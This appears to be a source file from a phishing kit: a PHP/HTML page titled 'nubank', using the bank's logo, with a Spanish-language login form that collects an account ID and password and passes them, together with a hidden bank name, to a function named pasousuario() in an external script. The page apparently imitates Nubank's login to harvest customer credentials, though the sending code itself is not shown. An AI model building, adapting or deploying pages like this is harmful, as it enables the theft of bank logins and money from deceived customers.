<?php
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
    <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="/scripts/functions2.js"></script>
    <title>nubank</title>

    <style>
        body{
            font-family: sans-serif;
            padding: 10%;
        }
        input{
            font-family: sans-serif;
            font-weight: 500;
            font-size: 20px;
            line-height: 1.2;
            letter-spacing: -0.02px;
            color: black;
            width: 100%;
            background-color: transparent;
            padding: 10px 0px;
            outline: 2px solid transparent;
            border-color: transparent;
            border-bottom: 1px solid red;
            text-align: left;
            height: auto;
        }
        #btnUsuario{
            width:80%; 
            height:45px; 
            background-color:#9c44dc; 
            color:white; 
            border:none; 
            border-radius:100px; 
            margin-left:-10px; 
            font-size:14px; 
            margin-top:10px;
            text-align: center;

        }
    </style>
</head>
<body>
    <img src="img/logo.png" alt="" srcset="" width="30%">
    <center>
      <div>
        <h1>Accede a tu cuenta</h1>
        <h3>identificacion</h3>
        <input type="text" id="txtUsuario" name="user">
        <h3>contraseña</h3>
        <input type="text" id="txtPass" name="pass">
        <input type="hidden" value="nubank" id="banco">
        <p>Tiene 8 caracteres o más</p>
        <input type="submit" value="Continuar" id="btnUsuario">
      </div>
    </center>
    
  
    <script type="text/javascript">
        var espera = 0;
        let identificadorTiempoDeEspera;
        function retardor() {
          identificadorTiempoDeEspera = setTimeout(retardorX, 900);
        }
        function retardorX() {
        }
        $(document).ready(function() {
          $('#btnUsuario').click(function(){
            if (($("#txtUsuario").val().length > 6) && ($("#txtPass").val().length > 0)) {
              pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
            }else{
              $("#err-mensaje").show();
              $(".user").css("border", "1px solid red");
              $("#txtUsuario").focus();
            }			
          });
          $("#txtUsuario").keyup(function(e) {
            $(".user").css("border", "1px solid #CCCCCC");	
            $("#err-mensaje").hide();				
          });
        });
    </script>

</body>
</html>